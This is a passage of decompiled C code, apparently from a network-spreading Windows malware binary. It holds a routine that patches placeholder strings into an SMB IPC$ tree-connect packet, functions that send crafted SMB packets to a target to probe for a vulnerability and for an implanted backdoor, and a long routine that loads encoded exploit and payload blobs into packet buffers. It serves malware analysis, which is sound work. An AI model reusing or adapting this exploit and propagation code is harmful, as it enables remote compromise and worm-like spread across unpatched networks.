    int32_t v8 = (int32_t)(0x431bde83 * (int64_t)v3 / 0x100000000) / 0x40000; // 0x401739
    int32_t dwMilliseconds = v8 - 10 + (v8 >> 31); // ebx
    QueryPerformanceCounter((struct _LARGE_INTEGER *)&lpPerformanceCount);
    g4 = result2;
    int32_t v9 = lpPerformanceCount + (int32_t)v6; // 0x40175c
    g5 = v9;
    g7 = result2 + v1 + (int32_t)(v9 < lpPerformanceCount);
    g2 = (int32_t)(struct _LARGE_INTEGER *)g2;
    if (dwMilliseconds >= 1) {
        // 0x401765
        Sleep(dwMilliseconds);
        // branch -> 0x40176c
    }
    // 0x40176c
    g3 = *(int32_t *)0x40a098;
    int32_t v10 = &lpPerformanceCount2;
    QueryPerformanceCounter((struct _LARGE_INTEGER *)&lpPerformanceCount2);
    g1 = result2;
    int32_t v11 = g7; // 0x40177d
    g1182 = result2 == v11;
    if (result2 > v11) {
        // 0x4017a4
        return result2;
    }
    // 0x401781
    int32_t result3;
    uint32_t v12; // 0x401796
    if (result2 >= v11) {
        int32_t v13 = lpPerformanceCount2;
        g4 = v13;
        uint32_t v14 = g5; // 0x401787
        if (v13 >= v14) {
            // 0x4017a4
            return result2;
        }
        g1182 = v13 == v14;
        g6 = v10;
        ((int32_t (*)(int32_t))g3)(v10);
        result3 = lpPerformanceCount2;
        g1 = result3;
        v12 = g7;
        g1182 = result3 == v12;
        while (result3 < v12) {
            // 0x40178b
            g6 = v10;
            ((int32_t (*)(int32_t))g3)(v10);
            result3 = lpPerformanceCount2;
            g1 = result3;
            v12 = g7;
            g1182 = result3 == v12;
            // continue -> 0x40178b
        }
        // 0x40179a
        if (result3 > v12) {
            // 0x4017a4
            return result3;
        }
      lab_0x40179c:;
        // 0x40179c
        uint32_t v15;
        g4 = v15;
        uint32_t v16 = g5; // 0x4017a0
        g1182 = v15 == v16;
        if (v15 >= v16) {
            // break (via goto) -> 0x4017a4
            goto lab_0x4017a4;
        }
        // continue (via goto) -> 0x40178b
        goto lab_0x40178b;
    }
  lab_0x40178b:
    while (true) {
        // 0x40178b
        g6 = v10;
        ((int32_t (*)(int32_t))g3)(v10);
        result3 = lpPerformanceCount2;
        g1 = result3;
        v12 = g7;
        g1182 = result3 == v12;
        if (result3 >= v12) {
            // break -> 0x40179a
            break;
        }
        // continue -> 0x40178b
    }
    // 0x40179a
    if (result3 <= v12) {
        goto lab_0x40179c;
    }
  lab_0x4017a4:
    // 0x4017a4
    return result3;
}

// Address range: 0x4017b0 - 0x40197f
int32_t function_4017b0(char * a1, char * a2) {
    int32_t v1 = g2; // 0x4017b7
    int32_t v2 = g7; // 0x4017b8
    int32_t str = 0; // bp-1224
    int32_t v3;
    memset((char *)&v3, 0, 49);
    v3 = 0;
    *(char *)((int32_t)&v3 | 2) = 0;
    sprintf((char *)&str, "\\\\%s\\IPC$", a1);
    g5 = &str;
    int32_t v4;
    int32_t v5 = &v4; // 0x4017f0_2
    strlen((char *)&str);
    int32_t v6;
    int32_t v7 = &v6; // 0x4017f8_0
    g2 = v7;
    int32_t v8 = function_401140((char *)&g65, "__USERID__PLACEHOLDER__", 95); // 0x401808
    char * v9;
    int32_t v10;
    int32_t v11; // 0x4018ad
    if (v8 == 0) {
        // 0x4017b0
        v9 = (char *)&v10;
        v11 = g3;
        // branch -> 0x4018ad
    } else {
        int32_t v12 = v8 - 0x42e494; // 0x401823
        memcpy((char *)&v10, (char *)&g65, v12 / 4);
        int32_t v13 = (int32_t)a2; // eax
        memcpy((char *)&v10, (char *)&g65, v12 & 3);
        *(char *)(g8 + 224 + v12) = *(char *)v13;
        *(char *)(g8 + 225 + v12) = *(char *)(v13 + 1);
        uint32_t v14 = g3 - v12 - strlen("__USERID__PLACEHOLDER__"); // 0x401870
        char * v15 = (char *)(g8 + 226 + v12);
        int32_t v16 = v8 + strlen("__USERID__PLACEHOLDER__"); // 0x401887
        char * v17 = (char *)v16;
        g7 = v16;
        memcpy(v15, v17, v14 / 4);
        memcpy(v15, v17, v14 & 3);
        g5 = (int32_t)"__USERID__PLACEHOLDER__";
        int32_t v18 = 97 - strlen("__USERID__PLACEHOLDER__"); // 0x4018ab
        v9 = (char *)&v10;
        v11 = v18;
        // branch -> 0x4018ad
    }
    int32_t v19 = function_401140(v9, "__TREEPATH_REPLACE__", v11); // 0x4018bb
    int32_t result; // 0x401973
    if (v19 == 0) {
        // 0x4018ad
        result = g3;
        // branch -> 0x401968
    } else {
        // 0x4018cf
        memcpy((char *)&g65, v9, v7);
        memcpy((char *)&g65, v9, v7);
        int32_t v20;
        memcpy((char *)&v20, (char *)&str, v7);
        memcpy((char *)&v20, (char *)&str, v7);
        strlen("__TREEPATH_REPLACE__");
        int32_t v21 = g3 - v7 - v5; // 0x401928
        strlen("__TREEPATH_REPLACE__");
        char * v22 = (char *)(v19 + v5);
        g6 = v21;
        memcpy((char *)&v20, v22, v21 / 4);
        memcpy((char *)&v20, v22, v21 & 3);
        int32_t len = strlen("__TREEPATH_REPLACE__");
        g4 = len;
        result = g2 - len + g3;
        // branch -> 0x401968
    }
    // 0x401968
    g7 = v2;
    *(char *)&g66 = (char)(result + 252);
    g2 = v1;
    return result;
}

// Address range: 0x401980 - 0x401b6f
int32_t function_401980(struct sockaddr * cp, int32_t host_short) {
    int32_t v1 = g5; // bp-1052
    int32_t buf = 0; // bp-1024
    int32_t v2;
    g4 = (int32_t)memset((char *)&v2, 0, 255);
    v2 = 0;
    *(char *)((int32_t)&v2 | 2) = 0;
    g5 = (int32_t)cp;
    int32_t addr = 2; // bp-1040
    inet_addr((char *)cp);
    htons((int16_t)host_short);
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x4019cd
    g7 = sock_fd;
    if (sock_fd == -1) {
        // 0x401b56
        g5 = v1;
        return 0;
    }
    // 0x4019dd
    g4 = &addr;
    if (connect(sock_fd, (struct sockaddr *)&addr, 16) == -1 || send(g7, (char *)&g63, 88, 0) == -1) {
        // 0x401b50
        closesocket(g7);
        // branch -> 0x401b56
        // 0x401b56
        g5 = v1;
        return 0;
    }
    int32_t v3 = &buf; // 0x401a0d_0
    g6 = v3;
    if (recv(g7, (char *)&buf, 1024, 0) == -1 || send(g7, (char *)&g64, 103, 0) == -1 || recv(g7, (char *)&buf, 1024, 0) == -1) {
        // 0x401b50
        closesocket(g7);
        // branch -> 0x401b56
        // 0x401b56
        g5 = v1;
        return 0;
    }
    // 0x401a59
    int32_t v4;
    int32_t v5 = 0x1000000 * v4 / 0x1000000; // 0x401a65_0
    int32_t v6 = v5;
    int32_t length = function_4017b0((char *)g5, (char *)&v6); // 0x401a6f
    if (send(g7, (char *)&g65, length, 0) == -1) {
        // 0x401b50
        closesocket(g7);
        // branch -> 0x401b56
        // 0x401b56
        g5 = v1;
        return 0;
    }
    // 0x401a8e
    g4 = v3;
    if (recv(g7, (char *)&buf, 1024, 0) == -1) {
        // 0x401b50
        closesocket(g7);
        // branch -> 0x401b56
        // 0x401b56
        g5 = v1;
        return 0;
    }
    // 0x401aa9
    int32_t v7;
    g4 = g4 & -256 | v7 & 255;
    int32_t v8;
    g6 = g6 & -256 | v8 & 255;
    int32_t v9;
    char v10 = v9; // 0x401ab5
    *(char *)&g68 = v10;
    *(char *)&g70 = v10;
    v6 = v5;
    *(char *)&g72 = (char)v4;
    int32_t v11;
    *(char *)&g73 = (char)v11;
    char v12 = v7; // 0x401ae7
    *(char *)&g69 = v12;
    *(char *)&g71 = v12;
    *(char *)&g74 = (char)v8;
    int32_t v13;
    *(char *)&g75 = (char)v13;
    if (send(g7, (char *)&g67, 78, 0) == -1) {
        // 0x401b50
        closesocket(g7);
        // branch -> 0x401b56
        // 0x401b56
        g5 = v1;
        return 0;
    }
    // 0x401b08
    g4 = v3;
    int32_t v14 = recv(g7, (char *)&buf, 1024, 0); // 0x401b15
    if (v14 != -1) {
        // 0x401b1f
        int32_t v15;
        if ((char)v15 == 5) {
            // 0x401b26
            int32_t v16;
            if ((char)v16 == 2) {
                // 0x401b2d
                int32_t v17;
                if ((v14 & -256 || v17 & 255) == 0) {
                    // 0x401b35
                    int32_t v18;
                    if ((char)v18 == -64) {
                        // 0x401b3c
                        closesocket(g7);
                        g5 = v1;
                        return 1;
                    }
                }
            }
        }
    }
    // 0x401b50
    closesocket(g7);
    // branch -> 0x401b56
    // 0x401b56
    g5 = v1;
    return 0;
}

// Address range: 0x401b70 - 0x401d7f
int32_t function_401b70(char * cp, int32_t a2, int32_t host_short) {
    int32_t v1 = g3; // 0x401b76
    int32_t v2 = g5; // 0x401b78
    int32_t buf = 0; // bp-1024
    int32_t addr = 2; // bp-1040
    int32_t v3;
    memset((char *)&v3, 0, 255);
    v3 = 0;
    *(char *)((int32_t)&v3 | 2) = 0;
    inet_addr(cp);
    g4 = host_short;
    htons((int16_t)host_short);
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x401bbe
    if (sock_fd == -1) {
        // 0x401d68
        g5 = v2;
        g3 = v1;
        return 0;
    }
    // 0x401bce
    g6 = &addr;
    if (connect(sock_fd, (struct sockaddr *)&addr, 16) == -1 || send(sock_fd, (char *)&g76, 137, 0) == -1) {
        // 0x401d62
        closesocket(sock_fd);
        // branch -> 0x401d68
        // 0x401d68
        g5 = v2;
        g3 = v1;
        return 0;
    }
    int32_t v4 = &buf; // 0x401c01_0
    if (recv(sock_fd, (char *)&buf, 1024, 0) == -1 || send(sock_fd, (char *)&g77, 140, 0) == -1) {
        // 0x401d62
        closesocket(sock_fd);
        // branch -> 0x401d68
        // 0x401d68
        g5 = v2;
        g3 = v1;
        return 0;
    }
    // 0x401c35
    g4 = v4;
    if (recv(sock_fd, (char *)&buf, 1024, 0) == -1) {
        // 0x401d62
        closesocket(sock_fd);
        // branch -> 0x401d68
        // 0x401d68
        g5 = v2;
        g3 = v1;
        return 0;
    }
    // 0x401c50
    int32_t v5;
    int32_t v6 = g3 & -256 | v5 & 255; // ebx
    *(char *)&g79 = (char)v5;
    int32_t v7;
    int32_t v8 = 0x1000000 * v7 / 0x1000000; // 0x401c69_0
    g80[0] = v7;
    if (send(sock_fd, (char *)&g78, 96, 0) == -1) {
        // 0x401d62
        closesocket(sock_fd);
        // branch -> 0x401d68
        // 0x401d68
        g5 = v2;
        g3 = v1;
        return 0;
    }
    // 0x401c80
    g6 = v4;
    if (recv(sock_fd, (char *)&buf, 1024, 0) == -1) {
        // 0x401d62
        closesocket(sock_fd);
        // branch -> 0x401d68
        // 0x401d68
        g5 = v2;
        g3 = v1;
        return 0;
    }
    // 0x401c9b
    int32_t v9;
    g4 = g4 & -256 | v9 & 255;
    g6 = g6 & -256 | v8 & 255;
    int32_t v10;
    *(char *)&g82 = (char)v10;
    *(char *)&g83 = (char)v9;
    *(char *)&g84 = (char)v6;
    g85[0] = v8;
    if (send(sock_fd, (char *)&g81, 82, 0) == -1) {
        // 0x401d62
        closesocket(sock_fd);
        // branch -> 0x401d68
        // 0x401d68
        g5 = v2;
        g3 = v1;
        return 0;
    }
    // 0x401cd6
    if (recv(sock_fd, (char *)&buf, 1024, 0) != -1) {
        // 0x401ced
        int32_t v11;
        if ((char)v11 == 81) {
            // 0x401cf4
            if (a2 != 0) {
                // 0x401d4d
                closesocket(sock_fd);
                g5 = v2;
                g3 = v1;
                return 1;
            }
            // 0x401cff
            *(char *)&g86 = 66;
            *(char *)&g87 = 14;
            *(char *)&g88 = 105;
            *(char *)&g89 = 0;
            *(char *)&g90 = 0;
            if (send(sock_fd, (char *)&g81, 82, 0) != -1) {
                // 0x401d36
                g4 = v4;
                if (recv(sock_fd, (char *)&buf, 1024, 0) != -1) {
                    // 0x401d4d
                    closesocket(sock_fd);
                    g5 = v2;
                    g3 = v1;
                    return 1;
                }
            }
            // 0x401d62
            closesocket(sock_fd);
            // branch -> 0x401d68
            // 0x401d68
            g5 = v2;
            g3 = v1;
            return 0;
        }
    }
    // 0x401d62
    closesocket(sock_fd);
    // branch -> 0x401d68
    // 0x401d68
    g5 = v2;
    g3 = v1;
    return 0;
}

// Address range: 0x401d80 - 0x406eaf
int32_t function_401d80(void) {
    g6 = 1;
    g1 = 0;
    int32_t v1 = 137; // ebx
    *(int16_t *)&g123 = 2;
    g124 = 1;
    g125 = 0;
    g126 = 0;
    *(int16_t *)&g127 = 0;
    g128 = 1;
    g129 = 137;
    memcpy((char *)&g130, (char *)&g25, 34);
    *(char *)&g130 = *(char *)&g25;
    g131 = -0x60000000;
    g132 = 0x3f19b90e;
    *(int16_t *)&g133 = (int16_t)g6;
    g134 = g6;
    g135 = -0x75400000;
    g136 = 0x3f87d760;
    *(int16_t *)&g137 = 0;
    g138 = g6;
    g139 = 140;
    memcpy((char *)&g140, (char *)&g26, 35);
    g146 = 117;
    *(int16_t *)&g147 = 105;
    g141 = -0x51400000;
    g142 = 0x3f87fd66;
    *(int16_t *)&g143 = (int16_t)g6;
    g144 = g6;
    g145 = 6;
    g148 = 0xa400000;
    g149 = 0x3f842407;
    *(int16_t *)&g150 = 0;
    g151 = g6;
    g152 = 113;
    memcpy((char *)&g153, (char *)&g27, 28);
    *(char *)&g153 = *(char *)&g27;
    g159 = 116;
    *(int16_t *)&g160 = 105;
    g154 = -0x5f400000;
    g155 = 0x3f84f55d;
    *(int16_t *)&g156 = (int16_t)g6;
    g157 = g6;
    g158 = 6;
    g161 = -0x70200000;
    g162 = 0x3f84cd4a;
    *(int16_t *)&g163 = 0;
    g164 = g6;
    g165 = 1126;
    memcpy((char *)&g166, (char *)&g28, 38);
    *(char *)&g166 = *(char *)&g28;
    g167 = -0x4800000;
    g168 = 0x3f8d6219;
    *(int16_t *)&g169 = (int16_t)g6;
    g170 = g6;
    g171 = -0x59c00000;
    g172 = 0x3f882519;
    *(int16_t *)&g173 = 0;
    g174 = g6;
    g175 = 1502;
    memcpy((char *)&g176, (char *)&g29, 24);
    *(int16_t *)&g176 = *(int16_t *)&g29;
    char v2 = *(char *)((int32_t)&g29 + 2); // 0x401fd0
    *(char *)((int32_t)&g176 + 2) = v2;
    int32_t v3 = 1460; // ebp
    g177 = 0x63200000;
    g178 = 0x3f88f700;
    *(int16_t *)&g179 = 0;
    g180 = g6;
    g181 = 1460;
    memcpy((char *)&g182, (char *)&g30, 205);
    g183 = -0x50000000;
    g184 = 0x3f43a905;
    *(int16_t *)&g185 = 0;
    g186 = g6;
    g187 = 1233;
    memcpy((char *)&g188, "h5DH0RqsyNfEbXNTxRzla1zNfWz0bB4fqzrdNNfNXvtTv9FWqyXCEHLhOz9p7JXzJBBUd0OR9rg8DFXIyNXMHCfeX5v/e2cDPWn7sSP1HU8sivMdWSP79eiYWZ6DOYjDkYmaBrFWuOKpwLyotORDEi1GMahE7btGFTN2IMgml2b9wZvqSuc7aAciGNkl7+NgmkG9r323QqSJrjCgp+DJ9URAkHRp/ovZWeh65j6G5mVS3o3Ux5cH2pfT/VZm8xsBsr1o2YKlVmsY6mPAOnlmaEwFLrPTm5WIYnd0yOc3abTlt6R1RfwenXgqn5K1K6Uq5o7T+KblzWV1TXo0zTIBD/CwnKbkITPd7GkK+fG/pVTIAGxuI84OwkE6U9/WO3niv3bgLtebI/5Oj2ESIrNTwBRdIGzDYcK1VTlSYl0RMsMMZvWqZAhNBs9xfpyBgzAn+5NpIUwKnm6HS2UbNab6SQIQF53r0+Rx8w7xZkOEayDuGvPQ32Y7zfHtM8o8wsNxWPtI1zCcMUyHPA3zAeGkKIy51j911mdZeLmlXULTazhCdl+lYNd6aoUthPLUew6ng+vSLSxqF1N7+/bFkcWd5vuCPigEKxEg+X3d+JviOJaI9GJ2HWIT8ehFzv6JP7ymkH0XaHYKIXXDbGpMhJWmZzOd+KeEt4MY6Be95bnyjLPxR8Htcc2E35+8q074yiBdThfaOMI18K65supem5lEgTe2lQdQurhhNhgbmYPpmWsSerB8R4CiDHQg6B1xxN9lpUnCWCn37Ib9vdQ2V90almoOSh5FfBxJiPIERqxvWkHqv3h/c0c8MZ3kLJi/+5PD+F/rT0hmgD1lUoqZ9KfEAB/ivMQzIbMnhoJ6DpDZwXvWgYON+Ti4Of8cD3JVZFHKCPtFO1LWNuXu9DHS0cChPvbPTNgL1fuz3hWniAOjJxyXhilxEmUKoCuaHrjL7/mCwA8mUTF8nZfDOYFw/CN4ol8UuKSKKNotx6s4EGyOXAGxRTqQw5Rqr70SWFUVy18EO3TCMj/3eC7HjDV7CAh6+160YbDs53m7AehAx+OlUNq01wPuaxFfSqlgcUG+9Rn1b/Xp1jvWeSkCNdYiiiXi1XwsMrdhKZGKroSXSSJclExe6ZgcNNPa/HgjvXbwtmRkgiGneql4mBYmKDzcXCkp/tjnL6/KriY81gMHN4G9ulMunxVyF8wybDcifTOxtarjLXVRuC1Y7vzYaEuHT", 308);
    *(char *)&g188 = 104;
    g189 = -0x30000000;
    g190 = 0x3f147e6f;
    *(int16_t *)&g191 = 0;
    g192 = g6;
    g193 = 1502;
    memcpy((char *)&g194, (char *)&g31, 375);
    *(int16_t *)&g194 = *(int16_t *)&g31;
    g195 = -0x2a800000;
    g196 = 0x3f8ecd73;
    *(int16_t *)&g197 = 0;
    g198 = g6;
    g199 = v3;
    memcpy((char *)&g200, "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", 365);
    g201 = -0x40000000;
    g202 = 0x3f4608d3;
    *(int16_t *)&g203 = 0;
    g204 = g6;
    g205 = 1502;
    memcpy((char *)&g206, "3sxfTAmCeXYmxqp/uqbTXyzLuEeBVEQC+q+hJQIMH8S3pvjY4qziXxmKoxQJCp9NNfEPvrWQ2f5JF48rhgfAgfEBi9S+/TVTxxXrieIKawGSCbkmKBoAwY4WdzTcDYx4g//iNrX1QAaaoDf8vb9ATdjaHfqzNP9gurzND8sPwoq+ycAIaNYJiETdZI0B2Q+hKiGeDLdEO1saWq9h01RJDy/P9mlctezmygnbBrGg7c96cIg+6bdk1qzWg+4pL4TiW3oItBPL479EawjdSdG0ylAzArCpsQOKbLinzREtN4WvASRp630H2BfNIlTzTWOJgr31eRv2xeirFjtwqpcu5ALyz3Juw6ewjc7IGZ1a1D5hn82L2KejU4OnLaNrMFiGieF4C53LX7MZvVeUkxUg6qp+hCSfUIVUJUwgsHZrsz/fYuPWX1WzLJE9xN0mkiX53rb/c5+IzbStPqEtOiFSND6P1ud65kV4Gmp4WqeVftdcHAvBQCq44EmmKxWurmNEEojdq8jxZ7XRHVWtwu7DbGIiRbwmx82L4PeX3XIcLYMqqLBHpOO/vkaj2SMq93y4bWP9yrepQQ9pgralkGcVWBOlqZ6muD6zMY8kChC9NW9mzBRoUa4D8xlVjMpiqXlNggBIydZLt7KE5Nqcel/qY6hEc7FHT3+bPjHVKO5yCYF8R1Mun5ixLcdXS3NghRRf9qC3nr8XLuyVS/+ktxQYZlz0k48pfLrspxguOJkJER3GZcDT0B0rJHHIwqdx1VQVA3OUsbNBdNz0ReDlKIZt8kTDlk4mO8+YM9Uz2l6uV8QPCTDtYZZeaJCDxlQx+sXE2ZgAQEr6neprH8ycAIb64J3C5ZI0yFkLDbN2U+BkPA8otv1dADGEqxI1TtkOY/LcyNddDhyAW9gm4qf3MQyzclmKXbk8uEb3ZKFRmhGAUi+SFtzvnF6DZ5XCgpICgfBlIsU7SW6nO6yrRnOR6WKty1jMySkvyEUBr97g3YOgzTsp0vOZBz1mFpD0qJ7jOSjyWD5q+/HB7bJFC25fBV/a4+bp5dMa6s9wjOF9LUt1VPCd6mGZ1IxZQV94kzBmdbNoQNotIBUcyLOO3mtEyKHMarLQ7IdL3+6QPjrtZ676JFF6Fhco3kcwxLi7tEokjkrjiuxTJ7VOLMMoSqihIRgpTXkEvW4yy3O1fgQ+bAb0PNcCPaSxznfpGq9Rcq8uTkCgqDKEBujpjKKYi4BHd", 375);
    *(int16_t *)&g206 = 0x7333;
    g207 = 0x44000000;
    g208 = 0x3f3fff8f;
    *(int16_t *)&g209 = 0;
    g210 = g6;
    g211 = v3;
    memcpy((char *)&g212, "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